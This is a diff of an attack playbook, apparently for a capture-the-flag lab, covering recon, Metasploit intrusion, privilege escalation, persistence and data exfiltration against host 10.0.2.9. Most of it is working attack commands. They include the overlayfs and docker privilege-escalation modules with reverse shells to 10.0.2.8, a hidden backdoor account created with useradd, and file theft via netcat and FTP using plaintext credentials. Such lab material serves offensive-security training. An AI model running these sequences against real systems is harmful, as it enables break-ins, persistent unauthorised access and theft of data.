@@ -2,6 +2,10 @@ RECON OPTIONS
 1	nmap -sV -Pn -T5 -sS 10.0.2.9
 2	nmap -sV -Pn -T5 -sX 10.0.2.9	
 3	nmap -sV -Pn -T5 -sF 10.0.2.9
+4	msfconsole
+	use auxiliary/scanner/ssh/ssh_version
+	set rhosts 10.0.2.9
+	run
 
 INITIAL INTRUSION OPTIONS - result in backgrounded shells
 1	msfconsole
@@ -36,15 +40,14 @@ to give to backgrounded session Y use: sessions -i Y -c 'command'
 1	whoami
 2	groups
 3	uname -a
-4	find 
-		/ or local dir
-		-name 
-			3_of_hearts.png
-			10_of_clubs.wav
-			10_of_spades.png
+4a	find / -name 3_of_hearts.png
+4b	find / -name 10_of_clubs.wav
+4c	find /opt/readme -name 10_of_spades.png 
 
-PRIVILEGE ESCALATION OPTIONS, X is unprivileged session number
-1	use exploit/linux/local/overlayfs_priv_esc
+
+PRIVILEGE ESCALATION OPTIONS
+1 from msfconsole, X is unprivileged session number
+	use exploit/linux/local/overlayfs_priv_esc
 	set payload linux/x86/shell/reverse_tcp #?default
 	set target 0
 	set session X
@@ -52,7 +55,8 @@ PRIVILEGE ESCALATION OPTIONS, X is unprivileged session number
 	set lport 5678
 	run -j
 
-2	use exploit/linux/local/docker_daemon_privilege_escalation
+2 from msfconsole, X is unprivileged session number
+	use exploit/linux/local/docker_daemon_privilege_escalation
 	set payload linux/x86/shell_reverse_tcp 
 	set lhost 10.0.2.8
 	set lport 1234
@@ -60,6 +64,20 @@ PRIVILEGE ESCALATION OPTIONS, X is unprivileged session number
 	exploit -j
 
 PERSISTANCE OPTIONS
-to give to backgrounded session Y use: sessions -i Y -c 'command'
-1	sessions -i Y -c 'useradd -g users -s /bin/bash -p $(echo itsatrap | openssl passwd -1 -stdin) adm_ackbar'
-	sessions -i Y -c 'usermod -a -G docker adm_ackbar'
+1 from msfconsole, X is root session number
+	sessions -i X -c 'useradd -g users -s /bin/bash -p $(echo itsatrap | openssl passwd -1 -stdin) adm_ackbar'
+	sessions -i X -c 'usermod -a -G docker adm_ackbar'
+
+DATA EXFIL OPTIONS
+1 from msfconsole, X is privileged session number
+	nc -l -p 1234 > 3_of_hearts.png &
+	sessions -i X -c 'nc 10.0.2.8 1234 < /lost+found/3_of_hearts.png' 
+
+2 from msfconsole, X is privileged session number
+	sessions -i X -c 'tar -czf 10_of_clubs.wav.tar.gz /home/artoo_detoo/music/10_of_clubs.wav'
+	sessions -i X -c 'mv 10_of_clubs.wav.tar.gz /home/boba_fett/10_of_clubs.wav.tar.gz'
+	wget --no-passive --ftp-user=boba_fett --ftp-password=mandalorian1 ftp://10.0.2.9/10_of_clubs.wav.tar.gz 
+
+3 from msfconsole, X is unprivileged session number
+	sessions -u X #produces Y unprivileged session number
+	sessions -i Y -C 'download /opt/readme_app/public/images/10_of_spades.png'
